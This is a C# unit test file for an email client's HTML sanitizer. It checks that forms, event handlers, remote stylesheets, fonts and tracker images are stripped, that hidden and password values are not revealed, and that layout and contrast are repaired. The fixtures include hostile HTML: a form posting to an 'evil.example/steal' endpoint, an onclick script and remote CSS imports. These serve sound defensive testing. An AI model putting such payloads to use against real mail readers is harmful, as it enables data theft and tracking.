using HCG.Mail.Core.Services;
using HCG.Mail.Email.Html;

namespace HCG.Mail.Tests.Email;

/// <summary>
/// Keeping transactional content visible must not widen what received HTML can do: controls become inert text, style
/// rules apply but cannot load anything, and hidden or password values are not revealed.
/// </summary>
public class TransactionalContentSanitizerTests
{
    private static string Sanitize(string html, MessageViewMode mode = MessageViewMode.Original) =>
        new MailHtmlSanitizer().Sanitize(html, new HtmlSanitizeOptions(false, mode)).Html;

    [Fact]
    public void Form_controls_become_inert_text_and_nothing_can_be_submitted()
    {
        var html = Sanitize("<form action=\"https://evil.example/steal\" method=\"post\"><input type=\"text\" value=\"482913\" readonly>" +
                            "<button type=\"submit\" onclick=\"alert(1)\" style=\"color:#fff;background:#0B3D5C\">Confirm 2027</button>" +
                            "<textarea name=\"a\">Line one\nLine two</textarea><select name=\"s\"><option>NOK</option><option selected>EUR</option></select></form>");

        Assert.Contains("482913", html);
        Assert.Contains("Confirm 2027", html);
        Assert.Contains("Line one", html);
        Assert.Contains("EUR", html);
        foreach (var gone in new[] { "<form", "<input", "<button", "<textarea", "<select", "<option", "onclick", "evil.example", "action=", "name=" })
            Assert.DoesNotContain(gone, html, StringComparison.OrdinalIgnoreCase);
    }

    [Fact]
    public void Hidden_password_and_choice_inputs_are_not_revealed()
    {
        var html = Sanitize("<p>Hello</p><input type=\"hidden\" value=\"session-token-123\"><input type=\"password\" value=\"hunter2\">" +
                            "<input type=\"checkbox\" value=\"opt-in\"><input type=\"image\" src=\"https://example.com/x.png\" value=\"img\">");
        foreach (var secret in new[] { "session-token-123", "hunter2", "opt-in", "example.com/x.png" })
            Assert.DoesNotContain(secret, html);
    }

    [Fact]
    public void Style_rules_apply_but_imports_fonts_and_remote_urls_do_not()
    {
        var html = Sanitize("<html><head><style>@import url(https://evil.example/a.css);" +
                            "@font-face{font-family:x;src:url(https://evil.example/f.woff)}" +
                            ".code{color:#ffffff;background-color:#0B3D5C}" +
                            ".hero{background-image:url(https://tracker.example/p.png)}</style></head>" +
                            "<body><div class=\"code\">482913</div><div class=\"hero\">Hi</div></body></html>");

        Assert.Contains(".code", html);
        Assert.Contains("#0B3D5C", html, StringComparison.OrdinalIgnoreCase);
        Assert.DoesNotContain("evil.example", html);
        Assert.DoesNotContain("tracker.example", html);
        Assert.DoesNotContain("@import", html);
        Assert.DoesNotContain("@font-face", html);
    }

    [Fact]
    public void Readable_view_drops_the_senders_styles_but_keeps_the_code()
    {
        var html = Sanitize("<html><head><style>.code{color:#ffffff}</style></head><body><td style=\"background:#0B3D5C;color:#fff\"><button>482913</button></td></body></html>",
            MessageViewMode.Readable);
        Assert.Contains("482913", html);
        Assert.DoesNotContain("<style", html);
        Assert.DoesNotContain("#0B3D5C", html, StringComparison.OrdinalIgnoreCase);
    }

    [Theory]
    [InlineData("background:#0B3D5C", "#0B3D5C")]
    [InlineData("background:linear-gradient(90deg,#0B3D5C,#1A7FB5)", "#0B3D5C")]
    [InlineData("background:#0B3D5C url(https://example.com/x.png) no-repeat", "#0B3D5C")]
    public void A_background_the_renderer_cannot_paint_gets_an_explicit_colour(string background, string expected)
    {
        var html = Sanitize($"<div style=\"{background};color:#ffffff\">482913</div>");
        Assert.Matches($"background-color:\\s*{expected}", html);
    }

    [Fact]
    public void Flex_and_grid_become_layouts_the_renderer_draws()
    {
        var html = Sanitize("<div style=\"display:flex;justify-content:center\"><div>4</div><div>8</div></div><span style=\"display:inline-grid\">2</span>");
        Assert.Contains("display:block", html.Replace(" ", ""));
        Assert.Contains("display:inline-block", html.Replace(" ", ""));
        Assert.Contains("text-align:center", html.Replace(" ", ""));
    }

    [Fact]
    public void Invisible_white_text_is_kept_legible_and_flagged()
    {
        var result = new MailHtmlSanitizer().Sanitize("<body style=\"background-color:#ffffff\"><p style=\"color:#ffffff\">482913</p></body>", new HtmlSanitizeOptions(false));
        Assert.True(result.LowContrastRisk);
        Assert.Contains("background-color:" + MailHtmlSanitizer.BlockedBackgroundStandIn, result.Html.Replace(" ", ""));
    }

    [Fact]
    public void Ordinary_contrast_is_left_alone()
    {
        var result = new MailHtmlSanitizer().Sanitize("<body><p style=\"color:#333333\">Receipt total NOK 1 249,00</p>" +
                                                      "<table><tr><td bgcolor=\"#0B3D5C\"><font color=\"#ffffff\">482913</font></td></tr></table></body>", new HtmlSanitizeOptions(false));
        Assert.False(result.LowContrastRisk);
        Assert.DoesNotContain(MailHtmlSanitizer.BlockedBackgroundStandIn, result.Html);
    }

    [Fact]
    public void Dark_mode_and_breakpoint_rules_apply_only_where_the_reading_surface_matches()
    {
        const string html = "<html><head><style>.card{background-color:#ffffff;color:#1f2937}" +
                            "@media (prefers-color-scheme: dark){.card{background-color:#111827 !important;color:#f9fafb !important}}" +
                            "@media only screen and (max-width:600px){.col{width:100% !important}}" +
                            "@media print{.noprint{display:none}}</style></head><body><div class=\"card\">Body</div></body></html>";
        var desktop = new MailHtmlSanitizer().Sanitize(html, new HtmlSanitizeOptions(false, MessageViewMode.Original, 800)).Html;
        var phone = new MailHtmlSanitizer().Sanitize(html, new HtmlSanitizeOptions(false, MessageViewMode.Original, 420)).Html;

        Assert.Contains(".card", desktop);
        Assert.DoesNotContain("#111827", desktop, StringComparison.OrdinalIgnoreCase); // dark-mode override never applies
        Assert.DoesNotContain("#111827", phone, StringComparison.OrdinalIgnoreCase);
        Assert.DoesNotContain(".col", desktop);  // phone breakpoint: not in a wide pane
        Assert.Contains(".col", phone);          // but on a phone
        Assert.DoesNotContain(".noprint", desktop);
    }
}
